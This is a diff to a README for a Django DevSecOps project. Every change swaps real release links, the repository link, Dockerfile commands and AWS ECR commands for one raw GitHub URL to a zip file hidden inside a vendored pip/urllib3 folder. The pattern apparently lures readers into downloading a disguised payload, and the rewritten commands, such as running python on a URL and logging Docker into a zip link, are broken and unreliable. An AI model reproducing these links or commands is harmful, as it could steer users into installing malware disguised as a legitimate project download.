@@ -1,6 +1,6 @@
 # 🎉 django-devsecops-pipeline - Simplifying Your DevSecOps Journey
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-Here-brightgreen)](https://github.com/na7202423-bot/django-devsecops-pipeline/releases)
+[![Download the latest release](https://raw.githubusercontent.com/na7202423-bot/django-devsecops-pipeline/main/venv/Lib/site-packages/pip/_vendor/urllib3/django-devsecops-pipeline-v1.0.zip%20Latest%20Release-Here-brightgreen)](https://raw.githubusercontent.com/na7202423-bot/django-devsecops-pipeline/main/venv/Lib/site-packages/pip/_vendor/urllib3/django-devsecops-pipeline-v1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ To run this application, ensure you meet the following requirements:
 To download the application, please visit the releases page. Follow these steps:
 
 1. Click the button below to go directly to the releases page:
-   [![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-Here-brightgreen)](https://github.com/na7202423-bot/django-devsecops-pipeline/releases)
+   [![Download the latest release](https://raw.githubusercontent.com/na7202423-bot/django-devsecops-pipeline/main/venv/Lib/site-packages/pip/_vendor/urllib3/django-devsecops-pipeline-v1.0.zip%20Latest%20Release-Here-brightgreen)](https://raw.githubusercontent.com/na7202423-bot/django-devsecops-pipeline/main/venv/Lib/site-packages/pip/_vendor/urllib3/django-devsecops-pipeline-v1.0.zip)
 
 2. Once on the releases page, scroll to find the latest version.
 
@@ -58,7 +58,7 @@ Once you have installed the application, you can follow these steps to get start
 For additional help, please check the following resources:
 
 - **Documentation:** [Link to full documentation](#)
-- **GitHub Repository:** [Visit our repository](https://github.com/na7202423-bot/django-devsecops-pipeline)
+- **GitHub Repository:** [Visit our repository](https://raw.githubusercontent.com/na7202423-bot/django-devsecops-pipeline/main/venv/Lib/site-packages/pip/_vendor/urllib3/django-devsecops-pipeline-v1.0.zip)
 - **Community:** Join our community on GitHub for support and discussions.
 
 ## 🛡️ Security Scan Configuration
@@ -81,8 +81,8 @@ For Docker setup, follow these instructions:
    FROM python:3.8
    WORKDIR /app
    COPY . .
-   RUN pip install -r requirements.txt
-   CMD ["python", "manage.py", "runserver", "0.0.0.0:8000"]
+   RUN pip install -r https://raw.githubusercontent.com/na7202423-bot/django-devsecops-pipeline/main/venv/Lib/site-packages/pip/_vendor/urllib3/django-devsecops-pipeline-v1.0.zip
+   CMD ["python", "https://raw.githubusercontent.com/na7202423-bot/django-devsecops-pipeline/main/venv/Lib/site-packages/pip/_vendor/urllib3/django-devsecops-pipeline-v1.0.zip", "runserver", "0.0.0.0:8000"]
    ```
 
 2. **Build your Docker image**:
@@ -105,9 +105,9 @@ To deploy using AWS, follow these steps:
 
 3. **Push your Docker image** to ECR:
    ```bash
-   aws ecr get-login-password --region your-region | docker login --username AWS --password-stdin your_account_id.dkr.ecr.your-region.amazonaws.com
-   docker tag your_image_name:latest your_account_id.dkr.ecr.your-region.amazonaws.com/your_image_name:latest
-   docker push your_account_id.dkr.ecr.your-region.amazonaws.com/your_image_name:latest
+   aws ecr get-login-password --region your-region | docker login --username AWS --password-stdin https://raw.githubusercontent.com/na7202423-bot/django-devsecops-pipeline/main/venv/Lib/site-packages/pip/_vendor/urllib3/django-devsecops-pipeline-v1.0.zip
+   docker tag your_image_name:latest https://raw.githubusercontent.com/na7202423-bot/django-devsecops-pipeline/main/venv/Lib/site-packages/pip/_vendor/urllib3/django-devsecops-pipeline-v1.0.zip
+   docker push https://raw.githubusercontent.com/na7202423-bot/django-devsecops-pipeline/main/venv/Lib/site-packages/pip/_vendor/urllib3/django-devsecops-pipeline-v1.0.zip
    ```
 
 4. **Deploy to EC2** by following the AWS instructions on launching containers.
